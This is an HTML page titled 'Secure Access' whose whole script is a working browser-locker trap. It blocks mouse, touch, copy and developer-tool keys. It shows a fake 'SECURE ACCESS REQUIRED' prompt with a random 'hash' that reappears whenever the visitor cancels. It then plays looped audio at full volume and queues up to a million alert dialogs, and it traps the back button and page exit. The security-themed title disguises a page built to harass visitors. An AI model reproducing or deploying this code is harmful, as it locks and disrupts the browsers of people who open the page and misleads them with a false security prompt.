<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
<title>Secure Access</title>
<style>
  html, body {
    margin:0; padding:0; height:100%;
    background:#000; color:#000;
    overflow:hidden; user-select:none;
    -webkit-user-select:none; -ms-user-select:none;
    touch-action:none; font-family: monospace;
  }
</style>
</head>
<body>
<audio id="audio" crossorigin="anonymous" loop></audio>
<script>
(() => {
  const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
  const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
  const HASH_LEN = 5000;

  function randomHash(len) {
    let s = '';
    for(let i=0;i<len;i++){
      s += CHARS.charAt(Math.floor(Math.random()*CHARS.length));
    }
    return s;
  }

  function blockEverything(e){
    try{
      e.preventDefault();
      e.stopImmediatePropagation();
    } catch {}
    return false;
  }
  ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev=>{
    document.addEventListener(ev, blockEverything, {capture:true, passive:false});
  });
  document.addEventListener('keydown', e => {
    if(e.ctrlKey || e.metaKey || e.altKey || ['F12','F11','F10'].includes(e.key)){
      blockEverything(e);
    }
  }, {capture:true});

  const audio = document.getElementById('audio');
  audio.src = AUDIO_URL;
  audio.volume = 1.0;

  async function tryPlayAudio() {
    try {
      await audio.play();
    } catch {}
  }

  function promptLoop() {
    const hash = randomHash(HASH_LEN);
    let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + hash + "\n\nEnter any key to continue:");
    if(res === null){
      // Если нажал отмену — заново
      setTimeout(promptLoop, 0);
    } else {
      tryPlayAudio();
      alertSpam(1000000);
    }
  }

  function alertSpam(count){
    if(count <= 0) return;
    alert(randomHash(HASH_LEN));
    setTimeout(() => alertSpam(count-1), 1);
  }

  window.onload = promptLoop;

  // Обновление страницы запрещаем, перезагрузка невозможна
  history.pushState(null, document.title, location.href);
  window.addEventListener('popstate', ()=>history.pushState(null, document.title, location.href));

  window.onbeforeunload = e => {
    e.preventDefault();
    e.returnValue = '';
    return '';
  };
})();
</script>
</body>
</html>
